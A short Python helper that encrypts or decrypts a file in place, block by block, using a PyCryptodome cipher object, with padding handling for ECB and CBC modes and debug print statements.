from Crypto.Util.Padding import pad,unpad
from Crypto.Cipher._mode_ecb import EcbMode
from Crypto.Cipher._mode_cbc import CbcMode

def modify_file_inplace(filename, crypto, encrypt, blocksize=16):
    '''
    Open `filename` and encrypt/decrypt according to `crypto`

    :filename: a filename (preferably absolute path)
    :crypto: a stream cipher function that takes in a plaintext,
             and returns a ciphertext of identical length
    :encrypt: encrypt is 1 and decrypt is 0
    :blocksize: length of blocks to read and write.
    :return: None
    '''
    if encrypt:
        crypto_op = crypto.encrypt
    else:
        crypto_op = crypto.decrypt
    with open(filename, 'r+b') as f:
        pt = f.read(blocksize)

        if isinstance(crypto, EcbMode) or isinstance(crypto, CbcMode):
            padding_need = True
        else:
            padding_need = False
        while pt:
            print(pt, len(pt))
            if encrypt and len(pt)%blocksize and padding_need:
                plaintext = pad(pt, blocksize)
            else:
                plaintext = pt
            print(plaintext, len(plaintext))
            ciphertext = crypto_op(plaintext)
            if len(plaintext) != len(ciphertext):
                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))

            f.seek(-len(pt), 1) # return to same point before the read
            print("C:",ciphertext,len(ciphertext))
            if (not encrypt) and padding_need:
                try:
                    ct = unpad(ciphertext, blocksize)
                except ValueError as e:
                    if str(e) == "Padding is incorrect.":
                        ct = ciphertext
                    else:
                        raise
            else:
                ct = ciphertext
            f.write(ct)
            if ct != ciphertext:
                f.truncate()
            
            pt = f.read(blocksize)
